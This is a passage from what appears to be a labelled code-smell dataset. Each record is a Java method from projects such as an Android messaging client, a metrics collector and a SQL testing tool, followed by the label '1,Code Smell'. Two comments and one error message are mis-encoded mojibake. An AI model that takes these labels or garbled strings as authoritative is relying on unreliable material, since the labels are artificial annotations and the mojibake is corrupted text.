    for (    Tablet tablet : tabletMap.values()) {
      this.sessionPool.insertTablet(tablet,true);
    }
  }
 catch (  StatementExecutionException|IoTDBConnectionException e) {
    log.error(e.getMessage(),e);
  }
 finally {
    for (    Tablet tablet : tabletMap.values()) {
      tablet.reset();
    }
    tabletMap.clear();
  }
}",1,Code Smell
"@Override public void onItemClick(int id){
  if (id == -1) {
    finishFragment();
  }
 else   if (id == done_button) {
    sendReorder();
    saveName();
  }
}
@Override public void onItemClick(View view,int position){
  if (view instanceof UsernameCell) {
    TLRPC.TL_username username=((UsernameCell)view).currentUsername;
    if (username == null || ((UsernameCell)view).loading) {
      return;
    }
    if (username.editable) {
      if (botId != 0) {
        return;
      }
      listView.smoothScrollToPosition(0);
      focusUsernameField(true);
      return;
    }
    new AlertDialog.Builder(getContext(),getResourceProvider()).setTitle(username.active ? LocaleController.getString(""UsernameDeactivateLink"",R.string.UsernameDeactivateLink) : LocaleController.getString(""UsernameActivateLink"",R.string.UsernameActivateLink)).setMessage(username.active ? LocaleController.getString(""UsernameDeactivateLinkProfileMessage"",R.string.UsernameDeactivateLinkProfileMessage) : LocaleController.getString(""UsernameActivateLinkProfileMessage"",R.string.UsernameActivateLinkProfileMessage)).setPositiveButton(username.active ? LocaleController.getString(""Hide"",R.string.Hide) : LocaleController.getString(""Show"",R.string.Show),(di,e) -> {
      boolean wasActive=username.active;
      String reqUsername=username.username;
      boolean reqActive=!username.active;
      TLObject req;
      if (botId == 0) {
        TLRPC.TL_account_toggleUsername toggle=new TLRPC.TL_account_toggleUsername();
        toggle.username=reqUsername;
        toggle.active=reqActive;
        req=toggle;
      }
 else {
        TLRPC.TL_bots_toggleUsername toggle=new TLRPC.TL_bots_toggleUsername();
        toggle.bot=MessagesController.getInstance(currentAccount).getInputUser(botId);
        toggle.username=reqUsername;
        toggle.active=reqActive;
        req=toggle;
      }
      getConnectionsManager().sendRequest(req,(res,err) -> {
        AndroidUtilities.runOnUIThread(() -> {
          loadingUsernames.remove(reqUsername);
          if (res instanceof TLRPC.TL_boolTrue) {
            toggleUsername(position,reqActive);
          }
 else           if (err != null && ""USERNAMES_ACTIVE_TOO_MUCH"".equals(err.text)) {
            username.active=reqActive;
            toggleUsername(position,username.active);
            new AlertDialog.Builder(getContext(),getResourceProvider()).setTitle(LocaleController.getString(""UsernameActivateErrorTitle"",R.string.UsernameActivateErrorTitle)).setMessage(LocaleController.getString(""UsernameActivateErrorMessage"",R.string.UsernameActivateErrorMessage)).setPositiveButton(LocaleController.getString(""OK"",R.string.OK),(d,v) -> toggleUsername(username,wasActive,true)).show();
          }
 else {
            toggleUsername(username,wasActive,true);
          }
          TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(getUserId());
          getMessagesController().updateUsernameActiveness(user,username.username,username.active);
        }
);
      }
);
      loadingUsernames.add(username.username);
      ((UsernameCell)view).setLoading(true);
    }
).setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),(di,e) -> {
      di.dismiss();
    }
).show();
  }
 else   if (view instanceof InputCell) {
    focusUsernameField(true);
  }
}",1,Code Smell
"private void checkImageReceiversAttachState(){
  boolean newAttachState=attachedToWindow;
  if (newAttachState != imageReceiversAttachState) {
    imageReceiversAttachState=newAttachState;
    if (newAttachState) {
      radialProgress.onAttachedToWindow();
      videoRadialProgress.onAttachedToWindow();
      if (pollAvatarImages != null) {
        for (int a=0; a < pollAvatarImages.length; a++) {
          pollAvatarImages[a].onAttachedToWindow();
        }
      }
      if (commentAvatarImages != null) {
        for (int a=0; a < commentAvatarImages.length; a++) {
          commentAvatarImages[a].onAttachedToWindow();
        }
      }
      giveawayMessageCell.onAttachedToWindow();
      giveawayResultsMessageCell.onAttachedToWindow();
      replyImageReceiver.onAttachedToWindow();
      locationImageReceiver.onAttachedToWindow();
      blurredPhotoImage.onAttachedToWindow();
      if (photoImage.onAttachedToWindow()) {
        if (drawPhotoImage) {
          updateButtonState(false,false,false);
        }
      }
 else {
        updateButtonState(false,false,false);
      }
      animatedEmojiReplyStack=AnimatedEmojiSpan.update(AnimatedEmojiDrawable.CACHE_TYPE_MESSAGES,this,false,animatedEmojiReplyStack,replyTextLayout);
      animatedEmojiDescriptionStack=AnimatedEmojiSpan.update(AnimatedEmojiDrawable.CACHE_TYPE_MESSAGES,this,false,animatedEmojiDescriptionStack,descriptionLayout);
      updateAnimatedEmojis();
    }
 else {
      radialProgress.onDetachedFromWindow();
      videoRadialProgress.onDetachedFromWindow();
      if (pollAvatarImages != null) {
        for (int a=0; a < pollAvatarImages.length; a++) {
          pollAvatarImages[a].onDetachedFromWindow();
        }
      }
      if (commentAvatarImages != null) {
        for (int a=0; a < commentAvatarImages.length; a++) {
          commentAvatarImages[a].onDetachedFromWindow();
        }
      }
      replyImageReceiver.onDetachedFromWindow();
      locationImageReceiver.onDetachedFromWindow();
      photoImage.onDetachedFromWindow();
      blurredPhotoImage.onDetachedFromWindow();
      giveawayMessageCell.onDetachedFromWindow();
      giveawayResultsMessageCell.onDetachedFromWindow();
      AnimatedEmojiSpan.release(this,animatedEmojiDescriptionStack);
      AnimatedEmojiSpan.release(this,animatedEmojiReplyStack);
      AnimatedEmojiSpan.release(this,animatedEmojiStack);
    }
  }
  boolean newVisibleState=attachedToWindow && (visibleOnScreen || !shouldCheckVisibleOnScreen);
  if (newVisibleState != imageReceiversVisibleState) {
    imageReceiversVisibleState=newVisibleState;
    if (newVisibleState) {
      fileAttach(true,currentMessageObject);
    }
 else {
      fileDetach(currentMessageObject);
    }
  }
}",1,Code Smell
"/** 
 * [鏍规嵁libraries鐨勫寘鍚嶈繃婊ょ浉鍏虫潯鐩甝
 */
public static String[] filterByPkgName(final String[] originalPkgNames,final String[] filterPkgNames){
  ArrayList<String> result=new ArrayList<>();
  for (  String name : originalPkgNames) {
    int a=0;
    String packname="""";
    boolean res=false;
    for (int i=0; i < name.length(); i++) {
      if (name.charAt(i) == ':') {
        a=i + 1;
        break;
      }
    }
    for (; a < name.length(); a++) {
      if (name.charAt(a) != ':') {
        packname=packname + name.charAt(a);
      }
 else {
        break;
      }
    }
    for (    String str : filterPkgNames) {
      if (str.equals(packname)) {
        res=true;
        break;
      }
    }
    if (!res) {
      result.add(name);
    }
  }
  String[] tmp=new String[result.size()];
  for (int a=0; a < result.size(); a++) {
    tmp[a]=result.get(a);
  }
  return tmp;
}",1,Code Smell
"private List<LocalStatisticsJsonStringObject> filterOncePerProvinceStatistics(List<LocalStatisticsJsonStringObject> jsonStringObjects){
  List<LocalStatisticsJsonStringObject> onePerProvinceStatistics=new ArrayList<>();
  Map<String,List<LocalStatisticsJsonStringObject>> groupedByProvince=jsonStringObjects.stream().filter(LocalStatisticsJsonStringObject::isComplete).collect(groupingBy(LocalStatisticsJsonStringObject::getProvinceCode,toList()));
  groupedByProvince.keySet().stream().forEach(key -> {
    List<LocalStatisticsJsonStringObject> sameProvinceStatistics=groupedByProvince.get(key);
    LocalStatisticsJsonStringObject mostRecentStatistic=null;
    LocalStatisticsJsonStringObject mostRecentHospitalizationStatistic=null;
    for (    LocalStatisticsJsonStringObject provinceStatistic : sameProvinceStatistics) {
      if (hasEmptyMostRecentStatistics(mostRecentStatistic,mostRecentHospitalizationStatistic)) {
        mostRecentStatistic=provinceStatistic;
        if (hasSevenDayHospitalizationStatistics(provinceStatistic)) {
          mostRecentHospitalizationStatistic=provinceStatistic;
        }
      }
 else {
        if (isBeforeMostRecentStatistics(mostRecentStatistic,provinceStatistic)) {
          mostRecentStatistic=provinceStatistic;
        }
        if (mostRecentHospitalizationStatistic == null) {
          if (hasSevenDayHospitalizationStatistics(provinceStatistic)) {
            mostRecentHospitalizationStatistic=provinceStatistic;
          }
        }
 else         if (isBeforeMostRecentStatistics(mostRecentHospitalizationStatistic,provinceStatistic) && hasSevenDayHospitalizationStatistics(provinceStatistic)) {
          mostRecentHospitalizationStatistic=provinceStatistic;
        }
      }
    }
    onePerProvinceStatistics.add(enhanceWithHospitalization(mostRecentStatistic,mostRecentHospitalizationStatistic));
  }
);
  return onePerProvinceStatistics;
}
",1,Code Smell
"private void parseResponseByPrometheusExporter(String resp,List<String> aliasFields,CollectRep.MetricsData.Builder builder){
  if (!EXPORTER_PARSER_TABLE.containsKey(builder.getId())) {
    EXPORTER_PARSER_TABLE.put(builder.getId(),new ExporterParser());
  }
  ExporterParser parser=EXPORTER_PARSER_TABLE.get(builder.getId());
  Map<String,MetricFamily> metricFamilyMap=parser.textToMetric(resp);
  String metrics=builder.getMetrics();
  if (metricFamilyMap.containsKey(metrics)) {
    MetricFamily metricFamily=metricFamilyMap.get(metrics);
    for (    MetricFamily.Metric metric : metricFamily.getMetricList()) {
      Map<String,String> labelMap=metric.getLabelPair().stream().collect(Collectors.toMap(MetricFamily.Label::getName,MetricFamily.Label::getValue));
      CollectRep.ValueRow.Builder valueRowBuilder=CollectRep.ValueRow.newBuilder();
      for (      String aliasField : aliasFields) {
        if (""value"".equals(aliasField)) {
          if (metric.getCounter() != null) {
            valueRowBuilder.addColumns(String.valueOf(metric.getCounter().getValue()));
          }
 else           if (metric.getGauge() != null) {
            valueRowBuilder.addColumns(String.valueOf(metric.getGauge().getValue()));
          }
 else           if (metric.getUntyped() != null) {
            valueRowBuilder.addColumns(String.valueOf(metric.getUntyped().getValue()));
          }
 else           if (metric.getInfo() != null) {
            valueRowBuilder.addColumns(String.valueOf(metric.getInfo().getValue()));
          }
 else           if (metric.getSummary() != null) {
            valueRowBuilder.addColumns(String.valueOf(metric.getSummary().getValue()));
          }
 else           if (metric.getHistogram() != null) {
            valueRowBuilder.addColumns(String.valueOf(metric.getHistogram().getValue()));
          }
        }
 else {
          String columnValue=labelMap.get(aliasField);
          valueRowBuilder.addColumns(columnValue == null ? CommonConstants.NULL_VALUE : columnValue);
        }
      }
      builder.addValues(valueRowBuilder.build());
    }
  }
}
",1,Code Smell
"protected void selectXOnChart(int x,int y){
  if (chartData == null || isEmpty)   return;
  double theta=Math.atan2(chartArea.centerY() + AndroidUtilities.dp(16) - y,chartArea.centerX() - x);
  float a=(float)(Math.toDegrees(theta) - 90);
  if (a < 0)   a+=360D;
  a/=360;
  float p=0;
  int newSelection=-1;
  float selectionStartA=0f;
  float selectionEndA=0f;
  for (int i=0; i < lines.size(); i++) {
    if (!lines.get(i).enabled && lines.get(i).alpha == 0) {
      continue;
    }
    if (a > p && a < p + darawingValuesPercentage[i]) {
      newSelection=i;
      selectionStartA=p;
      selectionEndA=p + darawingValuesPercentage[i];
      break;
    }
    p+=darawingValuesPercentage[i];
  }
  if (currentSelection != newSelection && newSelection >= 0) {
    currentSelection=newSelection;
    invalidate();
    pieLegendView.setVisibility(VISIBLE);
    LineViewData l=lines.get(newSelection);
    pieLegendView.setData(l.line.name,(int)values[currentSelection],l.lineColor);
    pieLegendView.measure(MeasureSpec.makeMeasureSpec(getMeasuredWidth(),MeasureSpec.AT_MOST),MeasureSpec.makeMeasureSpec(getMeasuredHeight(),MeasureSpec.AT_MOST));
    float r=rectF.width() / 2;
    int xl=(int)Math.min(rectF.centerX() + r * Math.cos(Math.toRadians((selectionEndA * 360f) - 90f)),rectF.centerX() + r * Math.cos(Math.toRadians(((selectionStartA * 360f) - 90f))));
    if (xl < 0)     xl=0;
    if (xl + pieLegendView.getMeasuredWidth() > getMeasuredWidth() - AndroidUtilities.dp((16))) {
      xl-=xl + pieLegendView.getMeasuredWidth() - (getMeasuredWidth() - AndroidUtilities.dp(16));
    }
    int yl=(int)Math.min((rectF.centerY() + r * Math.sin(Math.toRadians((selectionStartA * 360f) - 90f))),rectF.centerY() + r * Math.sin(Math.toRadians(((selectionEndA * 360f) - 90f))));
    yl=(int)Math.min(rectF.centerY(),yl);
    yl-=AndroidUtilities.dp(50);
    pieLegendView.setTranslationX(xl);
    pieLegendView.setTranslationY(yl);
    if (!NekoConfig.disableVibration.Bool()) {
      boolean v=false;
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
        v=performHapticFeedback(HapticFeedbackConstants.TEXT_HANDLE_MOVE,HapticFeedbackConstants.FLAG_IGNORE_GLOBAL_SETTING);
      }
      if (!v) {
        performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP,HapticFeedbackConstants.FLAG_IGNORE_GLOBAL_SETTING);
      }
    }
  }
  moveLegend();
}",1,Code Smell
"private DeserializationRuntimeConverter getMultipleMigrationConverter(ZoneId serverTimeZone,DeserializationRuntimeConverterFactory userDefinedConverterFactory){
  return new DeserializationRuntimeConverter(){
    private static final long serialVersionUID=1L;
    @Override public Object convert(    Object dbzObj,    Schema schema) throws Exception {
      ConnectSchema connectSchema=(ConnectSchema)schema;
      List<Field> fields=connectSchema.fields();
      Map<String,Object> data=new HashMap<>();
      Struct struct=(Struct)dbzObj;
      for (      Field field : fields) {
        String fieldName=field.name();
        Object fieldValue=struct.getWithoutDefault(fieldName);
        Schema fieldSchema=schema.field(fieldName).schema();
        String schemaName=fieldSchema.name();
        if (schemaName != null) {
          fieldValue=getValueWithSchema(fieldValue,schemaName);
        }
        data.put(fieldName,fieldValue);
      }
      GenericRowData row=new GenericRowData(1);
      row.setField(0,data);
      return row;
    }
    @Override public Object convert(    Object dbzObj,    Schema schema,    TableChange tableSchema) throws Exception {
      ConnectSchema connectSchema=(ConnectSchema)schema;
      List<Field> fields=connectSchema.fields();
      Map<String,Object> data=new HashMap<>();
      Struct struct=(Struct)dbzObj;
      for (      Field field : fields) {
        String fieldName=field.name();
        Object fieldValue=struct.getWithoutDefault(fieldName);
        Schema fieldSchema=schema.field(fieldName).schema();
        String schemaName=fieldSchema.name();
        if (fieldValue instanceof Struct) {
          Column column=tableSchema.getTable().columnWithName(fieldName);
          LogicalType logicType=RecordUtils.convertLogicType(column,(Struct)fieldValue);
          DeserializationRuntimeConverter fieldConverter=createConverter(logicType,serverTimeZone,userDefinedConverterFactory);
          fieldValue=convertField(fieldConverter,fieldValue,fieldSchema);
          if (fieldValue instanceof DecimalData) {
            fieldValue=((DecimalData)fieldValue).toBigDecimal();
          }
          if (fieldValue instanceof TimestampData) {
            fieldValue=((TimestampData)fieldValue).toTimestamp();
          }
        }
        if (schemaName != null) {
          fieldValue=getValueWithSchema(fieldValue,schemaName);
        }
        if (fieldValue instanceof ByteBuffer) {
          fieldValue=new String(((ByteBuffer)fieldValue).array());
        }
        data.put(fieldName,fieldValue);
      }
      GenericRowData row=new GenericRowData(1);
      row.setField(0,data);
      return row;
    }
  }
;
}",1,Code Smell
"/** 
 * Create sink producers by configured topic set group topicSet to different group, each group is associated with a producer
 * @param cfgTopicSet  the configured topic set
 */
public synchronized void createProducersByTopicSet(Set<String> cfgTopicSet) throws Exception {
  if (cfgTopicSet == null || cfgTopicSet.isEmpty()) {
    return;
  }
  List<String> filteredTopics=new ArrayList<>(cfgTopicSet.size());
  for (  String topicName : cfgTopicSet) {
    if (StringUtils.isBlank(topicName) || producerMap.get(topicName) != null) {
      continue;
    }
    filteredTopics.add(topicName);
  }
  if (filteredTopics.isEmpty()) {
    return;
  }
  Collections.sort(filteredTopics);
  long startTime=System.currentTimeMillis();
  int maxPublishTopicCnt=clusterConfig.getMaxTopicsEachProducerHold();
  int allocTotalCnt=filteredTopics.size();
  List<Integer> topicGroupCnt=new ArrayList<>();
  int paddingCnt=(lastPubTopicCnt.get() <= 0) ? 0 : (maxPublishTopicCnt - lastPubTopicCnt.get());
  while (allocTotalCnt > 0) {
    if (paddingCnt > 0) {
      topicGroupCnt.add(Math.min(allocTotalCnt,paddingCnt));
      allocTotalCnt-=paddingCnt;
      paddingCnt=0;
    }
 else {
      topicGroupCnt.add(Math.min(allocTotalCnt,maxPublishTopicCnt));
      allocTotalCnt-=maxPublishTopicCnt;
    }
  }
  int startPos=0;
  int endPos=0;
  Set<String> subTopicSet=new HashSet<>();
  for (  Integer dltCnt : topicGroupCnt) {
    subTopicSet.clear();
    endPos=startPos + dltCnt;
    for (int index=startPos; index < endPos; index++) {
      subTopicSet.add(filteredTopics.get(index));
    }
    startPos=endPos;
    if (lastProducer == null || lastPubTopicCnt.get() == maxPublishTopicCnt) {
      lastProducer=sessionFactory.createProducer();
      lastPubTopicCnt.set(0);
    }
    try {
      lastProducer.publish(subTopicSet);
    }
 catch (    Throwable e) {
      logger.info(sinkName + "" meta sink publish fail."",e);
    }
    lastPubTopicCnt.addAndGet(subTopicSet.size());
    for (    String topicItem : subTopicSet) {
      producerMap.put(topicItem,lastProducer);
    }
  }
  logger.info(sinkName + "" initializes producers for topics:"" + producerMap.keySet()+ "", cost: ""+ (System.currentTimeMillis() - startTime)+ ""ms"");
}",1,Code Smell
"protected float adjustAndDistributeReward(float reward,int dimension,String distribution){
  float scaled_reward=reward;
  if (distribution == null || distribution.isEmpty())   return reward;
  List<String> parties=Arrays.asList(distribution.split("" ""));
  int ind=0;
  for (  String party : parties) {
    if (party.startsWith(this.agentName + "":""))     break;
    ind++;
  }
  if (ind == parties.size()) {
    ind=0;
    for (    String party : parties) {
      if (party.startsWith(""me:""))       break;
      ind++;
    }
  }
  if (ind != parties.size()) {
    String us=parties.get(ind);
    String[] parts=us.split("":"");
    if (parts.length != 2) {
      System.out.println(""ERROR: malformed argument for distribution of reward - "" + us);
      System.out.println(""Entire reward going to "" + this.agentName);
      return reward;
    }
 else {
      Float f=Float.valueOf(parts[1]);
      if (f != null) {
        scaled_reward=reward * f;
      }
    }
  }
 else   scaled_reward=0;
  Map<String,String> data=new HashMap<String,String>();
  for (  String agent : parties) {
    String[] parts=agent.split("":"");
    if (parts.length == 2 && ind != 0)     data.put(parts[0],parts[1]);
    ind--;
  }
  data.put(""original_reward"",((Float)reward).toString());
  data.put(""dimension"",((Integer)dimension).toString());
  MalmoMod.network.sendToServer(new MalmoMod.MalmoMessage(MalmoMessageType.CLIENT_SHARE_REWARD,0,data));
  return scaled_reward;
}",1,Code Smell
"public static List<String> getResultSetFirstColumnAsString(String queryString,ExpectedErrors errors,SQLGlobalState<?,?> state) throws SQLException {
  if (state.getOptions().logEachSelect()) {
    state.getLogger().writeCurrent(queryString);
    try {
      state.getLogger().getCurrentFileWriter().flush();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
  }
  boolean canonicalizeString=state.getOptions().canonicalizeSqlString();
  SQLQueryAdapter q=new SQLQueryAdapter(queryString,errors,true,canonicalizeString);
  List<String> resultSet=new ArrayList<>();
  SQLancerResultSet result=null;
  try {
    result=q.executeAndGet(state);
    if (result == null) {
      throw new IgnoreMeException();
    }
    while (result.next()) {
      String resultTemp=result.getString(1);
      if (resultTemp != null) {
        resultTemp=resultTemp.replaceAll(""[\\.]0+$"","""");
      }
      resultSet.add(resultTemp);
    }
  }
 catch (  Exception e) {
    if (e instanceof IgnoreMeException) {
      throw e;
    }
    if (e.getMessage() == null) {
      throw new AssertionError(queryString,e);
    }
    if (errors.errorIsExpected(e.getMessage())) {
      throw new IgnoreMeException();
    }
    throw new AssertionError(queryString,e);
  }
 finally {
    if (result != null && !result.isClosed()) {
      result.close();
    }
  }
  return resultSet;
}",1,Code Smell
"private ArrayList<TLObject> getUsers(boolean onlyContacts,boolean includeSmallChats){
  final MessagesController messagesController=MessagesController.getInstance(currentAccount);
  final HashMap<Long,Boolean> contains=new HashMap<>();
  final ArrayList<TLObject> users=new ArrayList<>();
  final ArrayList<TLRPC.Dialog> dialogs=messagesController.getAllDialogs();
  final ConcurrentHashMap<Long,TLRPC.TL_contact> contacts=ContactsController.getInstance(currentAccount).contactsDict;
  if (contacts == null || contacts.isEmpty()) {
    if (!loadedContacts) {
      ContactsController.getInstance(currentAccount).loadContacts(false,0);
    }
    loadedContacts=true;
  }
  for (int i=0; i < dialogs.size(); ++i) {
    TLRPC.Dialog dialog=dialogs.get(i);
    if (DialogObject.isUserDialog(dialog.id)) {
      TLRPC.User user=messagesController.getUser(dialog.id);
      if (user != null && !user.bot && user.id != 777000 && !UserObject.isUserSelf(user) && !user.deleted) {
        if (onlyContacts && (contacts == null || contacts.get(user.id) == null)) {
          continue;
        }
        contains.put(user.id,true);
        users.add(user);
      }
    }
 else     if (includeSmallChats && DialogObject.isChatDialog(dialog.id)) {
      TLRPC.Chat chat=messagesController.getChat(-dialog.id);
      if (chat == null || ChatObject.isChannelAndNotMegaGroup(chat)) {
        continue;
      }
      contains.put(-chat.id,true);
      users.add(chat);
    }
  }
  if (contacts != null) {
    for (    Map.Entry<Long,TLRPC.TL_contact> e : contacts.entrySet()) {
      long id=e.getKey();
      if (!contains.containsKey(id)) {
        TLRPC.User user=messagesController.getUser(id);
        if (user != null && !user.bot && user.id != 777000 && !UserObject.isUserSelf(user)) {
          users.add(user);
          contains.put(user.id,true);
        }
      }
    }
  }
  return users;
}",1,Code Smell
"@Override public void integrateSection(SortTriggering ts,SectionPos pos,DynamicData data,CameraMovement movement){
  long sectionPos=pos.asLong();
  var geometryPlanes=data.getGeometryPlanes();
  var iterator=this.normalLists.values().iterator();
  while (iterator.hasNext()) {
    var normalList=iterator.next();
    var normalPlanes=geometryPlanes.getPlanesForNormal(normalList);
    if (normalList.hasSection(sectionPos)) {
      if (normalPlanes == null) {
        if (this.removeSectionFromList(normalList,sectionPos)) {
          iterator.remove();
        }
      }
 else {
        normalList.updateSection(normalPlanes,sectionPos);
      }
    }
 else     if (normalPlanes != null) {
      normalList.addSection(normalPlanes,sectionPos);
    }
  }
  var aligned=geometryPlanes.getAligned();
  if (aligned != null) {
    for (    var normalPlane : aligned) {
      if (normalPlane != null) {
        this.addSectionInNewNormalLists(data,normalPlane);
      }
    }
  }
  var unaligned=geometryPlanes.getUnaligned();
  if (unaligned != null) {
    for (    var normalPlane : unaligned) {
      this.addSectionInNewNormalLists(data,normalPlane);
    }
  }
  data.discardGeometryPlanes();
  if (movement.hasChanged()) {
    for (    var normalList : this.normalLists.values()) {
      normalList.processCatchup(ts,movement,sectionPos);
    }
  }
}
",1,Code Smell
"public void processReadMessages(LongSparseIntArray inbox,long dialogId,int maxDate,int maxId,boolean isPopup){
  ArrayList<MessageObject> popupArrayRemove=new ArrayList<>(0);
  notificationsQueue.postRunnable(() -> {
    if (inbox != null) {
      for (int b=0; b < inbox.size(); b++) {
        long key=inbox.keyAt(b);
        int messageId=inbox.get(key);
        for (int a=0; a < pushMessages.size(); a++) {
          MessageObject messageObject=pushMessages.get(a);
          if (!messageObject.messageOwner.from_scheduled && messageObject.getDialogId() == key && messageObject.getId() <= messageId && !messageObject.isStoryReactionPush) {
            if (isPersonalMessage(messageObject)) {
              personalCount--;
            }
            popupArrayRemove.add(messageObject);
            long did;
            if (messageObject.isStoryReactionPush) {
              did=messageObject.getDialogId();
            }
 else             if (messageObject.messageOwner.peer_id.channel_id != 0) {
              did=-messageObject.messageOwner.peer_id.channel_id;
            }
 else {
              did=0;
            }
            SparseArray<MessageObject> sparseArray=pushMessagesDict.get(did);
            if (sparseArray != null) {
              sparseArray.remove(messageObject.getId());
              if (sparseArray.size() == 0) {
                pushMessagesDict.remove(did);
              }
            }
            delayedPushMessages.remove(messageObject);
            pushMessages.remove(a);
            a--;
          }
        }
      }
    }
    if (dialogId != 0 && (maxId != 0 || maxDate != 0)) {
      for (int a=0; a < pushMessages.size(); a++) {
        MessageObject messageObject=pushMessages.get(a);
        if (messageObject.getDialogId() == dialogId && !messageObject.isStoryReactionPush) {
          boolean remove=false;
          if (maxDate != 0) {
            if (messageObject.messageOwner.date <= maxDate) {
              remove=true;
            }
          }
 else {
            if (!isPopup) {
              if (messageObject.getId() <= maxId || maxId < 0) {
                remove=true;
              }
            }
 else {
              if (messageObject.getId() == maxId || maxId < 0) {
                remove=true;
              }
            }
          }
          if (remove) {
            if (isPersonalMessage(messageObject)) {
              personalCount--;
            }
            long did;
            if (messageObject.isStoryReactionPush) {
              did=messageObject.getDialogId();
            }
 else             if (messageObject.messageOwner.peer_id.channel_id != 0) {
              did=-messageObject.messageOwner.peer_id.channel_id;
            }
 else {
              did=0;
            }
            SparseArray<MessageObject> sparseArray=pushMessagesDict.get(did);
            if (sparseArray != null) {
              sparseArray.remove(messageObject.getId());
              if (sparseArray.size() == 0) {
                pushMessagesDict.remove(did);
              }
            }
            pushMessages.remove(a);
            delayedPushMessages.remove(messageObject);
            popupArrayRemove.add(messageObject);
            a--;
          }
        }
      }
    }
    if (!popupArrayRemove.isEmpty()) {
      AndroidUtilities.runOnUIThread(() -> {
        for (int a=0, size=popupArrayRemove.size(); a < size; a++) {
          popupMessages.remove(popupArrayRemove.get(a));
        }
        NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.pushMessagesUpdated);
      }
);
    }
  }
);
}",1,Code Smell
"@Override protected void drawChart(Canvas canvas){
  if (chartData != null) {
    float fullWidth=(chartWidth / (pickerDelegate.pickerEnd - pickerDelegate.pickerStart));
    float offset=fullWidth * (pickerDelegate.pickerStart) - HORIZONTAL_PADDING;
    canvas.save();
    float transitionAlpha=1f;
    if (transitionMode == TRANSITION_MODE_PARENT) {
      transitionAlpha=transitionParams.progress > 0.5f ? 0 : 1f - transitionParams.progress * 2f;
      canvas.scale(1 + 2 * transitionParams.progress,1f,transitionParams.pX,transitionParams.pY);
    }
 else     if (transitionMode == TRANSITION_MODE_CHILD) {
      transitionAlpha=transitionParams.progress < 0.3f ? 0 : transitionParams.progress;
      canvas.save();
      canvas.scale(transitionParams.progress,transitionParams.progress,transitionParams.pX,transitionParams.pY);
    }
 else     if (transitionMode == TRANSITION_MODE_ALPHA_ENTER) {
      transitionAlpha=transitionParams.progress;
    }
    for (int k=0; k < lines.size(); k++) {
      LineViewData line=lines.get(k);
      if (!line.enabled && line.alpha == 0)       continue;
      int j=0;
      int[] y=line.line.y;
      line.chartPath.reset();
      boolean first=true;
      float p;
      if (chartData.xPercentage.length < 2) {
        p=1f;
      }
 else {
        p=chartData.xPercentage[1] * fullWidth;
      }
      int additionalPoints=(int)(HORIZONTAL_PADDING / p) + 1;
      int localStart=Math.max(0,startXIndex - additionalPoints);
      int localEnd=Math.min(chartData.xPercentage.length - 1,endXIndex + additionalPoints);
      for (int i=localStart; i <= localEnd; i++) {
        if (y[i] < 0)         continue;
        float xPoint=chartData.xPercentage[i] * fullWidth - offset;
        float yPercentage=((float)y[i] * chartData.linesK[k] - currentMinHeight) / (currentMaxHeight - currentMinHeight);
        float padding=line.paint.getStrokeWidth() / 2f;
        float yPoint=getMeasuredHeight() - chartBottom - padding- (yPercentage) * (getMeasuredHeight() - chartBottom - SIGNATURE_TEXT_HEIGHT- padding);
        if (USE_LINES) {
          if (j == 0) {
            line.linesPath[j++]=xPoint;
            line.linesPath[j++]=yPoint;
          }
 else {
            line.linesPath[j++]=xPoint;
            line.linesPath[j++]=yPoint;
            line.linesPath[j++]=xPoint;
            line.linesPath[j++]=yPoint;
          }
        }
 else {
          if (first) {
            first=false;
            line.chartPath.moveTo(xPoint,yPoint);
          }
 else {
            line.chartPath.lineTo(xPoint,yPoint);
          }
        }
      }
      if (endXIndex - startXIndex > 100) {
        line.paint.setStrokeCap(Paint.Cap.SQUARE);
      }
 else {
        line.paint.setStrokeCap(Paint.Cap.ROUND);
      }
      line.paint.setAlpha((int)(255 * line.alpha * transitionAlpha));
      if (!USE_LINES)       canvas.drawPath(line.chartPath,line.paint);
 else       canvas.drawLines(line.linesPath,0,j,line.paint);
    }
    canvas.restore();
  }
}",1,Code Smell
"@Around(""@annotation(com.blossom.common.db.aspect.Pages)"") public Object around(ProceedingJoinPoint point) throws Throwable {
  Object[] args=point.getArgs();
  for (  Object arg : args) {
    if (arg instanceof PageReq) {
      PageReq page=(PageReq)arg;
      if (page.getPageNum() == 0) {
        page.setPageNum(1);
      }
      if (page.getPageSize() == 0) {
        page.setPageSize(10);
      }
      if (page.getPageSize() > 200) {
        page.setPageSize(200);
      }
      String orderBy;
      if (StrUtil.isNotBlank(page.getSortField())) {
        orderBy=page.getSortField();
        if (StrUtil.isNotBlank(page.getOrder())) {
          String order=page.getOrder().trim().toLowerCase();
          if (!""asc"".equals(order) && !""desc"".equals(order)) {
            throw new XzException400(""Order鍙傛暟閿欒,璇蜂娇鐢╗asc]鎴朳desc],褰撳墠浼犲叆鍊糩"" + order + ""]"");
          }
          orderBy=orderBy + "" "" + order;
        }
        PageHelper.startPage(page.getPageNum(),page.getPageSize(),orderBy);
      }
 else {
        PageHelper.startPage(page.getPageNum(),page.getPageSize());
      }
    }
  }
  try {
    return point.proceed(args);
  }
  finally {
  }
}",1,Code Smell
"private static Class<?> getJavaClassInner(String type){
  if (type.equals(DATATYPE_STRING)) {
    return String.class;
  }
  if (type.equals(DATATYPE_SHORT)) {
    return Short.class;
  }
  if (type.equals(DATATYPE_INTEGER)) {
    return Integer.class;
  }
  if (type.equals(DATATYPE_LONG)) {
    return Long.class;
  }
  if (type.equals(DATATYPE_DOUBLE)) {
    return Double.class;
  }
  if (type.equals(DATATYPE_FLOAT)) {
    return Float.class;
  }
  if (type.equals(DATATYPE_BYTE)) {
    return Byte.class;
  }
  if (type.equals(DATATYPE_CHARACTER)) {
    return Character.class;
  }
  if (type.equals(DATATYPE_BOOLEAN)) {
    return Boolean.class;
  }
  if (type.equals(DATATYPE_DATE)) {
    return java.sql.Date.class;
  }
  if (type.equals(DATATYPE_TIME)) {
    return java.sql.Time.class;
  }
  if (type.equals(DATATYPE_DATETIME)) {
    return java.sql.Timestamp.class;
  }
  if (type.equals(DATATYPE_OBJECT)) {
    return Object.class;
  }
  if (type.equals(DATATYPE_L_SHORT)) {
    return short.class;
  }
  if (type.equals(DATATYPE_L_INT)) {
    return int.class;
  }
  if (type.equals(DATATYPE_L_LONG)) {
    return long.class;
  }
  if (type.equals(DATATYPE_L_DOUBLE)) {
    return double.class;
  }
  if (type.equals(DATATYPE_L_FLOAT)) {
